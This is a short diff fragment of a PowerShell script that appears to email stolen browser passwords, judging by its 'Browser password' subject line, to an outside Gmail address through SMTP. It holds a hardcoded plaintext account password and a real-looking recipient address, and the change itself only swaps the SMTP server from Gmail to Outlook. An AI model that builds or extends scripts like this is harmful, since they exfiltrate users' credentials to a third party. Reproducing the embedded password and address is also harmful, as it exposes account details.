@@ -5,7 +5,7 @@ $Pass = "appreciation123"
 $To = "sabinshrestha15@gmail.com"
 $Subject = "Browser password"
 $Body = $username
-$SMTPServer = "smtp.gmail.com"
+$SMTPServer = "smtp.outlook.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
